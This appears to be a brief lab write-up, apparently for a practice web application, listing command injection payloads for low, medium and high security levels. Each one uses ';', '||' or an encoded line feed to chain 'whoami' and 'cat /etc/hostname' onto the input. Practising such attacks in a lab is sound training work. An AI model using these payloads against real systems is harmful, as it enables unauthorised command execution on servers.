# Command Injection

## low

```sh
>/dev/null;echo `whoami` `cat /etc/hostname`
```

## medium

```sh
>/dev/null||echo `whoami` `cat /etc/hostname`
```

## high

line feeds

```
>/dev/null%0Awhoami%0Acat%20/etc/hostname
```
